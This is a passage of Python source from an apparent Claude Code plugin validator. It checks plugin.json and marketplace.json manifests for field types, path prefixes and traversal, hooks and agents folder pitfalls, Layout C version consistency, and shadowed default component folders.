        # Path string — resolve relative to plugin_root and load.
        # Strip ONLY the literal "./" prefix (same dotfile-mangling trap as
        # `_mcp_server_keys`): `lstrip("./")` would turn a `./.monitors.json`
        # dotfile reference into `monitors.json`, so `is_file()` fails and the
        # monitors-file contents are silently skipped (a monitor missing
        # `command`/`description` would pass). The `[2:]` slice preserves the
        # leading dot.
        rel = monitors[2:] if monitors.startswith("./") else monitors
        monitors_path = (plugin_root / rel).resolve()
        if not monitors_path.is_file():
            # Missing file is already flagged elsewhere (path validator);
            # we only check contents when the file actually exists.
            return
        try:
            data = json.loads(monitors_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError) as err:
            report.major(f"monitors file could not be parsed: {err}", monitors)
            return
        # monitors.json can be an array or {monitors: [...]} wrapper.
        if isinstance(data, list):
            _validate_monitors_array(data, monitors, report, declared_skills)
        elif isinstance(data, dict) and isinstance(data.get("monitors"), list):
            _validate_monitors_array(data["monitors"], monitors, report, declared_skills)
        else:
            report.major(
                f"monitors file must contain an array or {{'monitors': [...]}} wrapper, got {type(data).__name__}",
                monitors,
            )
        return
    report.major(
        f"'monitors' must be an array or path string, got {type(monitors).__name__} (plugins-reference.md:268-318)",
        ".claude-plugin/plugin.json",
    )


def validate_layout_c_consistency(
    plugin_root: Path,
    report: ValidationReport,
) -> None:
    """Validate Layout C (marketplace-in-plugin) cross-consistency.

    Layout C exists when ONE root holds BOTH `.claude-plugin/plugin.json`
    AND `.claude-plugin/marketplace.json`. The marketplace must list the
    plugin's own name (self-reference) and version must match across the
    two manifests.

    Per references/marketplace-layouts.md§"Layout C", the rules are:
      1. plugin.json.name MUST appear in marketplace.json.plugins[].name
      2. The self-referenced plugin entry MUST use source: "./" (relative).
      3. plugin.json.version MUST equal marketplace.json.plugins[<self>].version
         (when both are set).

    Severities are MAJOR for hard mismatches (would break install) and
    MINOR for soft drift (cosmetic / future-confusion).
    """
    plugin_path = plugin_root / ".claude-plugin" / "plugin.json"
    market_path = plugin_root / ".claude-plugin" / "marketplace.json"
    if not plugin_path.is_file() or not market_path.is_file():
        return  # Not Layout C — single-manifest plugins are unaffected.

    try:
        plugin_obj = json.loads(plugin_path.read_text(encoding="utf-8"))
        market_obj = json.loads(market_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return  # Per-manifest validators already report parse errors.

    plugin_name = plugin_obj.get("name") if isinstance(plugin_obj, dict) else None
    plugin_version = plugin_obj.get("version") if isinstance(plugin_obj, dict) else None
    if not plugin_name:
        return  # Per-manifest validator already flagged missing name.

    plugins_arr = market_obj.get("plugins") if isinstance(market_obj, dict) else None
    if not isinstance(plugins_arr, list):
        return

    self_entry = None
    for entry in plugins_arr:
        if isinstance(entry, dict) and entry.get("name") == plugin_name:
            self_entry = entry
            break

    if self_entry is None:
        report.major(
            f"Layout C: plugin.json declares name='{plugin_name}' but "
            f"marketplace.json's plugins[] does not list a self-reference "
            f"with that name. Add `{{name: '{plugin_name}', source: './'}}` "
            f"to marketplace.json's plugins array, or remove marketplace.json "
            f"if this is meant to be a plain plugin.",
            ".claude-plugin/marketplace.json",
        )
        return

    # Rule 2 — source must be "./" (relative)
    src = self_entry.get("source")
    src_ok = src == "./" or src == "." or (isinstance(src, str) and src.strip() in ("./", "."))
    if not src_ok:
        report.major(
            f"Layout C: marketplace.json's self-reference for plugin "
            f"'{plugin_name}' has source={src!r}; must be './' (relative) "
            f"so install resolves to the same repo. Other source types "
            f"would re-clone the repository.",
            ".claude-plugin/marketplace.json",
        )

    # Rule 3 — version consistency
    self_version = self_entry.get("version")
    if plugin_version and self_version and plugin_version != self_version:
        report.minor(
            f"Layout C: plugin.json version '{plugin_version}' differs from "
            f"marketplace.json plugins[{plugin_name}].version '{self_version}'. "
            f"Bump both together to keep installation metadata consistent.",
            ".claude-plugin/marketplace.json",
        )

    # v2.81.0 (TRDD-c0ee9543, Phase B / GAP-13) — also use the shared
    # diff helper so description / author / keywords / homepage drift
    # between the two manifests surfaces. The helper emits NIT for
    # those fields (cosmetic), MAJOR for name (already covered above
    # by the self-entry-presence check), MINOR for version (already
    # covered above by Rule 3 — the helper will not double-report
    # because we short-circuit via opt-out logic below).
    try:
        from cpv_upstream_plugin_json import diff_marketplace_vs_upstream  # noqa: PLC0415
    except ImportError:
        return  # Module not available — pre-Phase-B install; nothing to add.

    # Don't double-emit NAME-MISMATCH or VERSION-DRIFT — those map to
    # the rules above. We only forward metadata drift findings.
    drifts = diff_marketplace_vs_upstream(self_entry, plugin_obj if isinstance(plugin_obj, dict) else {})
    for drift in drifts:
        if drift.code == "RC-MKPL-METADATA-DRIFT":
            report.nit(drift.message, ".claude-plugin/marketplace.json")


def validate_manifest(
    plugin_root: Path,
    report: ValidationReport,
    marketplace_only: bool = False,
    hosting_marketplace: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """Validate plugin.json manifest.

    Args:
        plugin_root: Path to the plugin directory
        report: ValidationReport to add results to
        marketplace_only: If True, skip plugin.json requirement
        hosting_marketplace: Parsed ``marketplace.json`` of the hosting
            marketplace (TRDD-20108ab7). Used to check cross-marketplace
            dependencies against the marketplace's
            ``allowedDependencyMarketplaces`` allowlist. ``None`` skips the
            cross-marketplace allowlist check (INFO emitted per cross-dep).

    Returns:
        The manifest dict if valid, None otherwise
    """
    manifest_path = plugin_root / ".claude-plugin" / "plugin.json"

    if not manifest_path.exists():
        if marketplace_only:
            msg = "plugin.json correctly absent (marketplace-only, strict=false)"
            report.passed(msg, ".claude-plugin/plugin.json")
            return None
        # GAP-27 (v2.22.3): plugin.json is OPTIONAL when components exist in default
        # directories per plugins-reference.md:374-385 — "If you include a manifest,
        # `name` is the only required field." Downgrade CRITICAL→MINOR when ANY of
        # the auto-discovered default directories has content. A plugin with
        # only commands/ is perfectly valid and the plugin name is derived from
        # the directory name per plugins-reference.md:341.
        default_component_dirs = (
            "commands",
            "skills",
            "agents",
            "hooks",
            "rules",
            "monitors",
            "output-styles",
        )
        has_components = any(
            (plugin_root / d).is_dir() and any((plugin_root / d).iterdir()) for d in default_component_dirs
        )
        if has_components:
            report.minor(
                "plugin.json not found — plugin is valid because components exist in "
                "default directories, but adding a manifest is recommended for "
                "discoverability and version control (plugins-reference.md:374-385)",
                ".claude-plugin/plugin.json",
            )
            return None
        report.critical(
            "plugin.json not found and no components in default directories "
            "(commands/, skills/, agents/, hooks/, rules/, monitors/, output-styles/)",
            ".claude-plugin/plugin.json",
        )
        return None

    if marketplace_only:
        report.major(
            "plugin.json EXISTS but should NOT for marketplace-only (strict=false). Remove .claude-plugin/plugin.json to fix CLI uninstall issues.",
            ".claude-plugin/plugin.json",
        )
        return None

    try:
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as e:
        report.critical(f"Invalid JSON in plugin.json: {e}", ".claude-plugin/plugin.json")
        return None

    report.passed("plugin.json is valid JSON", ".claude-plugin/plugin.json")

    # Fail-loud deprecation (TRDD-021250b5): the cpv.* size-override keys
    # (max_chars / max_lines / skill_size_severity) were removed — skill size
    # limits are now token-based and non-negotiable. Emit the WARNING ONCE here,
    # at the plugin level, where plugin.json is read a single time. (It used to
    # live in the per-skill token-budget check, which made validate_plugin fire
    # one identical warning per skill — 44× on CPV itself.)
    _removed_size_keys = removed_cpv_size_keys_present(load_cpv_config(plugin_root))
    if _removed_size_keys:
        report.warning(
            "plugin.json cpv." + ", cpv.".join(_removed_size_keys) + " no longer "
            "supported — skill size limits are token-based and non-negotiable "
            "(TRDD-021250b5).",
            ".claude-plugin/plugin.json",
        )

    # Required field: name (per Anthropic docs, ONLY 'name' is required)
    if "name" not in manifest:
        report.critical(
            "Missing required field 'name' in plugin.json",
            ".claude-plugin/plugin.json",
        )
    else:
        report.passed("Required field 'name' present", ".claude-plugin/plugin.json")

    # Recommended fields
    recommended_fields = ["version", "description"]
    for fld in recommended_fields:
        if fld not in manifest:
            report.minor(
                f"Missing recommended field '{fld}' in plugin.json",
                ".claude-plugin/plugin.json",
            )
        else:
            report.passed(
                f"Recommended field '{fld}' present",
                ".claude-plugin/plugin.json",
            )

    # Name validation — uses shared validate_component_name for uniform rules
    if "name" in manifest:
        name = manifest["name"]
        if isinstance(name, str):
            validate_component_name(name, "plugin", report)

    # Version validation — guard against non-string values (e.g. "version": 123)
    if "version" in manifest:
        version = manifest["version"]
        if not isinstance(version, str):
            report.major(
                f"Version must be a string, got {type(version).__name__}: {version}",
                ".claude-plugin/plugin.json",
            )
        elif not _PLUGIN_VERSION_RE.match(version):
            report.major(
                f"Version must be semver format (MAJOR.MINOR.PATCH, optional "
                f"-prerelease / +build, no leading zeros, no trailing garbage): {version}",
                ".claude-plugin/plugin.json",
            )

    # Check for unknown fields — warn but don't block, as custom fields
    # may be consumed by plugin scripts or external tooling.
    # Aligned with plugins-reference.md (v2.1.121).
    known_fields = {
        "name",
        "$schema",  # v2.1.120 — JSON-Schema link, ignored at load time
        "version",
        "description",
        "author",
        "homepage",
        "repository",
        "license",
        "keywords",
        "displayName",  # v2.1.143 — human-readable name shown in the /plugin picker; falls back to `name` when omitted, not used for namespacing
        "commands",
        "agents",
        "skills",
        "hooks",
        "mcpServers",
        "outputStyles",
        "themes",  # v2.1.118 — plugin-shipped theme JSON files under themes/
        "lspServers",
        "monitors",  # v2.1.105 — background monitor configs (monitors/monitors.json by default)
        "userConfig",  # User-configurable values prompted at enable time (v2.1.80)
        "channels",  # Channel declarations for message injection (v2.1.85)
        "dependencies",  # v2.1.110+ — plugin dependency declarations with semver ranges (see plugin-dependencies.md)
        "defaultEnabled",  # v2.1.154 — when false, plugin ships disabled; enable via /plugin or `claude plugin enable`
        # CPV-managed config block (TRDD-793ac32a strip-dev-parts). The
        # generator emits a `cpv.strip` block on every fresh scaffold, and
        # `cpv strip-dev-parts` reads it later. Allowlisted so CPV's own
        # creator output validates clean. Custom keys under `cpv.*` stay
        # under the same namespace per CPV ownership.
        "cpv",
        # v2.1.129 — preferred wrapper for opt-in/experimental features.
        # `themes` and `monitors` should now be declared under `experimental: { ... }`;
        # top-level placement still works but `claude plugin validate` warns.
        "experimental",
    }
    for key in manifest.keys():
        if key not in known_fields:
            report.warning(
                f"Unknown manifest field '{key}' — not part of the Claude Code plugin spec. If used by plugin scripts, consider documenting it.",
                ".claude-plugin/plugin.json",
            )

    # SECURITY (TRDD-02e1672b): the cpv.* finding-suppression opt-outs were
    # removed — a plugin must NOT be able to silence CPV findings from its own
    # config (a malicious author could self-exempt malicious content). Emit a
    # one-release deprecation WARNING for any still present; CPV ignores them.
    cpv_optout_block = manifest.get("cpv")
    if isinstance(cpv_optout_block, dict):
        for removed_key in (
            "allow_root_dirs",
            "allow_orchestrator_traversal",
            "allow_unversioned_dependencies",
            "allow_pipeline_drift",
        ):
            if removed_key in cpv_optout_block:
                report.warning(
                    f"[RC-DEPRECATED-OPTOUT] `cpv.{removed_key}` in plugin.json is "
                    f"no longer honored — CPV determines findings itself; a plugin "
                    f"cannot self-exempt (TRDD-02e1672b). Remove this key.",
                    ".claude-plugin/plugin.json",
                )

    # v2.1.129 — Recommend the `experimental: { themes, monitors }` wrapper.
    # Top-level `themes` and `monitors` are still honoured but `claude plugin
    # validate` emits a warning, so CPV mirrors that as a NIT (non-blocking
    # nudge) so authors discover the new shape without breaking existing files.
    experimental = manifest.get("experimental")
    for legacy_key in ("themes", "monitors"):
        # If author already nested the key under `experimental`, don't double-warn
        # on a top-level appearance — the CC loader prefers the nested copy.
        nested = isinstance(experimental, dict) and legacy_key in experimental
        if legacy_key in manifest and not nested:
            report.nit(
                f"'{legacy_key}' should be nested under 'experimental: {{ ... }}' "
                f"per v2.1.129. Top-level still works (claude plugin validate warns).",
                ".claude-plugin/plugin.json",
            )

    # When an `experimental` block is present, validate it's an object and only
    # contains recognised opt-in keys. Unknown keys inside `experimental` are
    # WARNINGs (the wrapper is a forward-compat surface, so we don't reject).
    if "experimental" in manifest:
        if not isinstance(experimental, dict):
            report.major(
                f"'experimental' must be an object, got {type(experimental).__name__} "
                "(plugins-reference.md / changelog v2.1.129)",
                ".claude-plugin/plugin.json",
            )
        else:
            known_experimental_keys = {"themes", "monitors"}
            for exp_key in experimental.keys():
                if exp_key not in known_experimental_keys:
                    report.warning(
                        f"Unknown 'experimental.{exp_key}' field — not part of the "
                        "Claude Code experimental opt-in surface (v2.1.129). "
                        f"Known keys: {sorted(known_experimental_keys)}.",
                        ".claude-plugin/plugin.json",
                    )

    # Validate repository field type — Claude Code requires a string URL, not an object
    if "repository" in manifest:
        repo_val = manifest["repository"]
        if not isinstance(repo_val, str):
            report.major(
                f'Field \'repository\' must be a string URL (e.g. "https://github.com/user/repo"), not {type(repo_val).__name__}. Claude Code rejects object format like {{"type":"git","url":"..."}}.',
                ".claude-plugin/plugin.json",
            )

    # Validate author field structure (plugins-reference.md:352 — object supports {name, email, url})
    if "author" in manifest:
        author = manifest["author"]
        if isinstance(author, str):
            report.passed("Author is a string (acceptable)", ".claude-plugin/plugin.json")
        elif isinstance(author, dict):
            if "name" not in author:
                report.major(
                    "'author' object missing required 'name' field",
                    ".claude-plugin/plugin.json",
                )
            elif not isinstance(author["name"], str):
                report.major(
                    "'author.name' must be a string",
                    ".claude-plugin/plugin.json",
                )
            else:
                report.passed("Author object has valid 'name' field", ".claude-plugin/plugin.json")
            # author.url (optional, v2.1.x — spec plugins-reference.md:352)
            if "url" in author and not isinstance(author["url"], str):
                report.major(
                    f"'author.url' must be a string, got {type(author['url']).__name__}",
                    ".claude-plugin/plugin.json",
                )
        else:
            report.major(
                f"'author' must be a string or object, got {type(author).__name__}",
                ".claude-plugin/plugin.json",
            )

    # Validate keywords field
    if "keywords" in manifest:
        kw = manifest["keywords"]
        if not isinstance(kw, list):
            report.major("'keywords' must be an array", ".claude-plugin/plugin.json")
        elif not all(isinstance(k, str) for k in kw):
            report.major("'keywords' must contain only strings", ".claude-plugin/plugin.json")
        else:
            report.passed(f"Keywords: {len(kw)} keyword(s)", ".claude-plugin/plugin.json")

    # v2.1.154 — defaultEnabled: false ships the plugin disabled (enable via
    # /plugin or `claude plugin enable`). Must be a boolean.
    if "defaultEnabled" in manifest:
        de = manifest["defaultEnabled"]
        if not isinstance(de, bool):
            report.major(
                f"'defaultEnabled' must be a boolean, got {type(de).__name__}",
                ".claude-plugin/plugin.json",
            )
        else:
            report.passed(f"defaultEnabled: {de}", ".claude-plugin/plugin.json")

    # Validate homepage and license field types
    for string_field in ("homepage", "license"):
        if string_field in manifest:
            val = manifest[string_field]
            if not isinstance(val, str):
                report.major(
                    f"'{string_field}' must be a string, got {type(val).__name__}",
                    ".claude-plugin/plugin.json",
                )

    # Validate component path fields start with ./
    # Also rejects `..` segments per plugins-reference.md:568-571 — paths escaping the
    # plugin root never resolve post-install because external files aren't copied to the cache.
    path_fields = [
        "commands",
        "agents",
        "skills",
        "hooks",
        "mcpServers",
        "outputStyles",
        "lspServers",
        "monitors",
    ]
    for key in path_fields:
        if key in manifest:
            value = manifest[key]
            if isinstance(value, str) and not value.startswith("./"):
                report.major(
                    f"Field '{key}' path must start with './': {value}",
                    ".claude-plugin/plugin.json",
                )
            if isinstance(value, str) and _path_has_traversal(value):
                report.major(
                    f"Field '{key}' contains path-traversal segment '..': {value} — "
                    "paths escaping the plugin root do not resolve post-install "
                    "(plugins-reference.md:568-571)",
                    ".claude-plugin/plugin.json",
                )
            elif isinstance(value, list) and key == "monitors":
                # `monitors` is the one path_field whose array form is an inline
                # list of monitor *objects* (dicts), not path strings — see the
                # spec (plugins-reference.md:268-318) and `validate_monitors_entries`,
                # which owns the full inline-array schema. Applying the generic
                # "each element must be a string path" rule here false-MAJORs every
                # spec-valid inline monitor (audit HIGH: "monitors[i] must be a
                # string path, got dict"). The string (path-reference) form is
                # still checked by the `isinstance(value, str)` branches above,
                # which `validate_monitors_entries` does NOT duplicate (no ./-prefix
                # or traversal check there). So: skip the list-element walk for
                # monitors; everything else falls through to the generic walk.
                pass
            elif isinstance(value, list):
                for i, path in enumerate(value):
                    if not isinstance(path, str):
                        report.major(
                            f"Field '{key}[{i}]' must be a string path, got {type(path).__name__}",
                            ".claude-plugin/plugin.json",
                        )
                    elif not path.startswith("./"):
                        report.major(
                            f"Field '{key}[{i}]' path must start with './': {path}",
                            ".claude-plugin/plugin.json",
                        )
                    elif _path_has_traversal(path):
                        report.major(
                            f"Field '{key}[{i}]' contains path-traversal segment '..': {path} — "
                            "paths escaping the plugin root do not resolve post-install "
                            "(plugins-reference.md:568-571)",
                            ".claude-plugin/plugin.json",
                        )
            elif isinstance(value, dict):
                # Inline configuration object - valid for hooks, mcpServers, lspServers
                if key in ("hooks", "mcpServers", "lspServers"):
                    report.passed(
                        f"Field '{key}' uses inline configuration object",
                        ".claude-plugin/plugin.json",
                    )
                else:
                    report.major(
                        f"Field '{key}' must be a string path or array, not an object",
                        ".claude-plugin/plugin.json",
                    )

    # Inline `userConfig` validation was removed here (v2.106): it duplicated
    # `validate_user_config_structure()` (called below at the end of this
    # function), so every userConfig defect was counted TWICE — inflating the
    # MAJOR/MINOR totals in the verdict's count table. The helper is now the
    # single source of truth: it owns the full v2.1.121 9-field schema AND the
    # non-dict / non-dict-entry MAJORs and the default/type-match check that
    # this inline block used to own (folded into the helper so no coverage was
    # lost).

    # Inline `channels` validation was removed here (v2.106), same reason: it
    # duplicated `validate_channels_structure()` (called below). The helper is
    # the single source of truth and is strictly broader — it resolves
    # mcpServers via `_mcp_server_keys` (handling the path-string and
    # {"mcpServers": {...}} wrapper forms the inline block never covered) and
    # validates per-channel userConfig.

    # Inline `lspServers` validation was removed here (TRDD-021250b5 Phase 3):
    # the comprehensive `validate_plugin_lsp()` is now the single source of truth
    # and is wired into parallel_tasks via the `validate_lsp` wrapper. It reads
    # plugin.json:lspServers itself (plus the external .lsp.json / lsp.json /
    # lsp-config.json / .vscode/settings.json files the inline block never
    # covered) and emits the correct severities, fixing the 8 severity
    # discrepancies the old inline block carried.

    # Claude Code auto-discovers standard directories at the plugin root.
    # Empirically verified 2026-04-18:
    #   - For commands/skills/outputStyles: pointing the manifest field at the default
    #     directory (e.g. "skills": "./skills/") is accepted and works fine — the docs
    #     even endorse this for "include the default in your array to keep both" form.
    #     CPV downgrades this to a MINOR redundancy nudge (was previously CRITICAL —
    #     false positive).
    #   - For hooks: pointing at the default directory (`hooks: "./hooks/"`, the DIR
    #     not the file) IS rejected by CC's validator with `hooks: Invalid input`. CPV
    #     keeps CRITICAL for this case.
    #   - For agents: see the dedicated `agents`-folder check below — folder paths in
    #     `agents` are ALWAYS rejected by CC with `agents: Invalid input`.
    # See `skills/fix-validation/references/empirical-loading-bugs.md` for evidence.
    auto_discovered_defaults = {
        "commands": "./commands/",
        "agents": "./agents/",
        "skills": "./skills/",
        "hooks": "./hooks/",
        "outputStyles": "./output-styles/",
    }
    # Fields where pointing at the default DIRECTORY actually breaks plugin loading
    # (verified empirically — CC's validator rejects these with `Invalid input`).
    breaks_loading_when_default = {"hooks"}
    for key, default_path in auto_discovered_defaults.items():
        if key not in manifest:
            continue
        value = manifest[key]
        # String pointing to the default directory
        if isinstance(value, str):
            normalized = value.replace("\\", "/").rstrip("/") + "/"
            if normalized == default_path:
                if key in breaks_loading_when_default:
                    report.critical(
                        f"Field '{key}' points to '{default_path}' which Claude Code rejects "
                        f"with `{key}: Invalid input` — the plugin will not load. Remove it "
                        "from plugin.json — only non-standard paths need explicit declaration.",
                        ".claude-plugin/plugin.json",
                    )
                elif key == "agents":
                    # Agents-folder rejection is handled by the dedicated agents check
                    # below (which provides a richer error message). Skip here.
                    pass
                else:
                    # commands / skills / outputStyles: redundant but harmless.
                    report.minor(
                        f"Field '{key}' points to '{default_path}' which Claude Code "
                        "auto-discovers anyway. This declaration is redundant. Remove the "
                        "field from plugin.json (the default folder is scanned automatically).",
                        ".claude-plugin/plugin.json",
                    )
        # Array of files inside the default directory
        elif isinstance(value, list) and all(isinstance(p, str) and p.startswith(default_path) for p in value):
            if key in breaks_loading_when_default:
                report.critical(
                    f"Field '{key}' lists items inside '{default_path}' which Claude Code "
                    f"rejects with `{key}: Invalid input` — the plugin will not load. "
                    "Remove it from plugin.json.",
                    ".claude-plugin/plugin.json",
                )
            elif key == "agents":
                # Skip — the dedicated agents check below handles this.
                pass
            else:
                report.minor(
                    f"Field '{key}' lists items inside '{default_path}' which Claude Code "
                    "auto-discovers anyway. This is redundant. Remove the field from "
                    "plugin.json (or include only items OUTSIDE the default folder).",
                    ".claude-plugin/plugin.json",
                )

    # `agents` field empirical constraint (NOT in docs schema): Claude Code's manifest
    # validator rejects ANY folder path in the `agents` field with the cryptic message
    # "agents: Invalid input" — both string and array forms, default folder OR not.
    # Only `.md` file paths are accepted. The docs' own complete-schema example
    # ("./custom/agents/") would actually fail this check. The default folder ./agents/
    # is no exception — empirically `agents: "./agents/"` ALSO fails with `Invalid input`
    # (auto_discovered_defaults CRITICAL skips agents because this dedicated check
    # provides the richer message).
    # If a plugin author skips `claude plugin validate` and publishes with a folder path,
    # CC silently drops the agents at runtime — no error in --debug log, agents simply
    # don't appear. Pre-empt CC's cryptic error with a clear, actionable message.
    # Empirical evidence: TRDD-20260418 (cpv-agents-other-folder-test, cpv-agents-default-test).
    agents_value = manifest.get("agents")
    if agents_value is not None:
        agents_paths: list[str] = []
        if isinstance(agents_value, str):
            agents_paths = [agents_value]
        elif isinstance(agents_value, list):
            agents_paths = [p for p in agents_value if isinstance(p, str)]
        for path_str in agents_paths:
            normalized = path_str.replace("\\", "/")
            # A folder path either ends with "/" or has no .md extension on its last segment.
            looks_like_folder = normalized.endswith("/") or not normalized.lower().endswith(".md")
            if not looks_like_folder:
                continue
            normalized_with_slash = normalized.rstrip("/") + "/"
            is_default = normalized_with_slash == "./agents/"
            extra_default_note = (
                (
                    " (Note: the default ./agents/ folder is auto-discovered — just remove "
                    "the 'agents' field entirely from plugin.json.)"
                )
                if is_default
                else ""
            )
            # Severity is MAJOR (not CRITICAL) by deliberate choice: an agents
            # folder-path drops ONLY the agents at runtime. The sibling
            # hooks-default check above is CRITICAL because its failure CASCADES
            # — a duplicate hooks file disables the plugin's OTHER capabilities
            # too (MCP servers fail with "hook-load-failed"), a strictly larger
            # blast radius. Both tiers block and mark the plugin INVALID, so the
            # verdict is correct either way; the tier difference reflects the
            # difference in blast radius, not a coverage gap.
            report.major(
                f"Field 'agents' contains folder path '{path_str}' — Claude Code's manifest validator "
                f"REJECTS folder paths in the 'agents' field with the cryptic error 'agents: Invalid input' "
                f"(both string and array forms). Only '.md' file paths are accepted. If you skip validate "
                f"and publish, CC silently drops the agents at runtime with no error. "
                f"Fix: list specific .md files like ['./agents/reviewer.md', './agents/tester.md'] "
                f"instead of '{path_str}'.{extra_default_note} Note: the docs' own complete-schema example "
                f"('./custom/agents/') is incorrect — it would also be rejected.",
                ".claude-plugin/plugin.json",
            )

    # Check for duplicate hooks loading — Claude Code auto-discovers hooks/hooks.json,
    # so explicitly pointing to it in plugin.json triggers a runtime ERROR with a CASCADE:
    # not only does Claude Code log "Duplicate hooks file detected" at runtime, but the
    # error also disables the plugin's other capabilities such as MCP servers
    # (debug log: "Plugin not available for MCP: <plugin>@inline - error type: hook-load-failed").
    # `claude plugin validate` does NOT catch this, so CPV emits MAJOR to give the author
    # a chance to spot the silent partial-failure mode before publishing.
    # Empirical evidence: TRDD-20260418 (cpv-hooks-doublefire-test) — hook fires once
    # (CC dedupes), but plugin's MCP servers fail to load with "hook-load-failed".
    # Handles BOTH string form ("./hooks/hooks.json") AND array form (["./hooks/hooks.json"])
    # AND path normalization (./hooks/./hooks.json, hooks\\hooks.json on Windows, etc.).
    def _is_default_hooks_path(path: str) -> bool:
        """True if path resolves to the auto-discovered hooks/hooks.json default."""
        normalized = path.replace("\\", "/")
        # Collapse "./" and "//" path segments — common authoring slip-ups.
        # We don't follow symlinks; static path equivalence is sufficient for this check.
        parts = [p for p in normalized.split("/") if p and p != "."]
        return parts == ["hooks", "hooks.json"]

    hooks_value = manifest.get("hooks")
    hooks_paths_to_check: list[str] = []
    if isinstance(hooks_value, str):
        hooks_paths_to_check = [hooks_value]
    elif isinstance(hooks_value, list):
        hooks_paths_to_check = [p for p in hooks_value if isinstance(p, str)]
    for hooks_path in hooks_paths_to_check:
        if _is_default_hooks_path(hooks_path):
            report.major(
                f"Field 'hooks' contains '{hooks_path}' which resolves to the auto-discovered "
                "'hooks/hooks.json' default. At runtime this triggers 'Duplicate hooks file detected' "
                "AND the cascading 'hook-load-failed' error DISABLES this plugin's MCP servers "
                "(silent partial failure — `claude plugin validate` does not catch it). "
                "Fix: remove the 'hooks' field from plugin.json (the default file is loaded automatically), "
                "or point it at a NON-default path like './hooks/extra.json'.",
                ".claude-plugin/plugin.json",
            )
            break  # Only emit once even if listed in array — the message is the same.

    # v2.84.0 — Plugin.json key shadows the default component folder (CC v2.1.140).
    # When plugin.json sets one of {commands, agents, skills, outputStyles},
    # the default folder is silently ignored at runtime: only the items the
    # author explicitly listed are loaded. Files left in the default folder
    # but not listed never reach Claude Code. CC's own /doctor / `claude plugin
    # list` / /plugin views started warning about this in v2.1.140; CPV emits
    # the same warning so authors catch the shadowing pre-publish.
    #
    # Coverage rules: the explicit value is considered to cover the default
    # folder if it (a) IS the default folder path as a string, (b) is an
    # array containing the default folder path, or (c) is an array that
    # lists every loadable item inside the default folder.
    _DEFAULT_COMPONENT_FOLDERS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
        # (manifest_key, default_folder, file_extensions)
        ("commands", "commands", (".md",)),
        ("agents", "agents", (".md",)),
        ("outputStyles", "output-styles", (".md",)),
    )

    def _norm_path(p: str) -> str:
        """Canonicalize a plugin.json path to a relative POSIX path with no
        leading ``./`` and no trailing ``/``. Accepts both ``"./commands/"``
        and ``"commands"`` and normalizes them to ``"commands"``."""
        n = p.replace("\\", "/").strip().rstrip("/")
        while n.startswith("./"):
            n = n[2:]
        return n

    def _list_default_folder_files(folder: Path, exts: tuple[str, ...]) -> list[str]:
        """Return loadable items in ``folder`` as POSIX-style ``folder/name``
        strings (no leading ``./``), scanning only the top level."""
        if not folder.is_dir():
            return []
        items = sorted(
            p.name for p in folder.iterdir() if p.is_file() and p.suffix.lower() in exts and not p.name.startswith(".")
        )
        return [f"{folder.name}/{n}" for n in items]

    def _list_default_skill_dirs(folder: Path) -> list[str]:
        """Return skill subdirs in ``./skills/`` that contain SKILL.md.
        Each returned path is normalized (no leading ``./``, no trailing ``/``)."""
        if not folder.is_dir():
            return []
        items: list[str] = []
        for sub in sorted(folder.iterdir()):
            if not sub.is_dir() or sub.name.startswith("."):
                continue
            # Skill folder is loadable if it contains SKILL.md (case-insensitive on macOS).
            for entry in sub.iterdir():
                if entry.is_file() and entry.name.lower() == "skill.md":
                    items.append(f"{folder.name}/{sub.name}")
                    break
        return items

    def _emit_shadow_warning(
        key: str,
        default_rel: str,
        shadowed: list[str],
    ) -> None:
        # Cap the listing to keep the message terminal-friendly.
        shown = shadowed if len(shadowed) <= 6 else shadowed[:6] + [f"... and {len(shadowed) - 6} more"]
        report.major(
            f"Field '{key}' is set in plugin.json — Claude Code v2.1.140+ silently ignores "
            f"the default '{default_rel}' folder when the matching key is declared. "
            f"{len(shadowed)} item(s) inside the default folder will NOT load at runtime: "
            f"{shown}. Fix: either remove the '{key}' field from plugin.json so the default "
            f"folder is auto-discovered, or add the missing entries to the explicit '{key}' "
            f"list. CC's /doctor, `claude plugin list`, and /plugin now surface this warning.",
            ".claude-plugin/plugin.json",
        )

    def _shadowed_items(value: Any, folder_name: str, default_contents: list[str]) -> list[str]:
        """Return default-folder items not reached by ``value``. Empty list
        means the explicit value already covers everything (no warning)."""
        if isinstance(value, str):
            covered = {_norm_path(value)}
        elif isinstance(value, list):
            covered = {_norm_path(p) for p in value if isinstance(p, str)}
        else:
            covered = set()
        # A bare-folder reference (e.g. "commands" or "./commands/") covers
        # all current AND future content in that folder.
        if folder_name in covered:
            return []
        return [item for item in default_contents if _norm_path(item) not in covered]

    for key, folder_name, exts in _DEFAULT_COMPONENT_FOLDERS:
        if key not in manifest:
            continue
        default_folder = plugin_root / folder_name
        default_contents = _list_default_folder_files(default_folder, exts)
        if not default_contents:
            continue
        shadowed = _shadowed_items(manifest[key], folder_name, default_contents)
        if shadowed:
            _emit_shadow_warning(key, f"./{folder_name}/", shadowed)

    # Skills are folder-based (./skills/<name>/SKILL.md). Same shadowing rule:
    # a 'skills' key in plugin.json suppresses auto-discovery of ./skills/.
    if "skills" in manifest:
        skills_folder = plugin_root / "skills"
        default_skills = _list_default_skill_dirs(skills_folder)
        if default_skills:
            shadowed = _shadowed_items(manifest["skills"], "skills", default_skills)
            if shadowed:
                _emit_shadow_warning("skills", "./skills/", shadowed)

    # v2.22.0 spec-parity helpers — dependencies, userConfig sub-fields, channels/mcp
    # cross-ref, and monitors entry shape. Each helper is a no-op when the corresponding
    # field is absent so unused manifests pay zero extra cost.
    # v2.22.3 (TRDD-20108ab7): dependencies receives hosting_marketplace context
    # so cross-marketplace refs can be checked against the allowlist.
    # v2.79+ (TRDD-20108ab7, 2026-05-10): when caller did NOT supply explicit
    # hosting_marketplace, attempt on-disk auto-discovery so end-users running
    # ``validate_plugin <path>`` with NO marketplace flag also get the
    # cross-marketplace enforcement (Layout C / Layout B / cache layout).
    # Explicit context always wins over auto-discovery (test:
    # test_validate_manifest_explicit_context_overrides_auto_discovery).
    effective_hosting = hosting_marketplace
    if effective_hosting is None and "dependencies" in manifest:
        # Only pay the discovery cost when the manifest actually has deps.
        # Manifests with no dependencies field never trigger the cross-mkt
        # path, so the parent-walk filesystem cost would be wasted.
        effective_hosting = discover_hosting_marketplace(plugin_root)
